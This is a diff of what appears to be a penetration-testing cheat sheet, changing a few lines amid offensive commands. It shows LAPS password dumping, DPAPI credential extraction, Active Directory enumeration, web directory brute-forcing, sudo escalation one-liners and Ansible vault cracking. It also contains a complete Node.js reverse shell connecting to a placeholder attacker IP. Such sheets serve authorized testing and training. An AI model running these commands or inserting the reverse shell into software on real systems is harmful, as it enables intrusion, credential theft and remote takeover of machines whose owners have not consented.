@@ -133,7 +133,7 @@ sharpview -E -M -- Get-DomainUser -TrustedToAuth
 
 sharplaps -M -E -- /host:<dc-ip>          # dump LAPS passwords (requires membership in LAPS readers group)
 
-sharpdpapi -- 'ps /target:c:\users\<user>\scripts\service.xml {masterkey-guid}:<masterkey-sha1>'
+sharpdpapi -- 'ps /target:c:\path\to\service.xml {masterkey-guid}:<masterkey-sha1>'
 
 cacls -- -filepath 'C:\Program Files'
 sa-netloggedon
@@ -743,7 +743,7 @@ gobuster dir -e -u http://<target-ip>/ -w seclists/Discovery/Web-Content/raft-me
 feroxbuster -u http://<target-ip>/ -w seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o ferox -t 200 -x asp,aspx -k
 ```
 
-### JS/Node.js Reverse Shell (e.g. in a CI pipeline / login handler)
+### JS/Node.js Reverse Shell
 ```js
 (function(){{var net=require("net"),cp=require("child_process"),sh=cp.spawn("cmd",[]);var client=new net.Socket();client.connect(<port>,"<attacker-ip>",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();
 ```
@@ -807,8 +807,6 @@ sudo lua -e 'os.execute("/bin/bash")'
 sudo su 
 ```
 Always check `sudo -l` first — https://gtfobins.org has an escalation recipe for almost every binary.
-
-### systemctl (GTFOBins) — see [Persistence](#persistence) section above for the `.service` payload.
 
 ### Ansible Vault Cracking
 ```sh
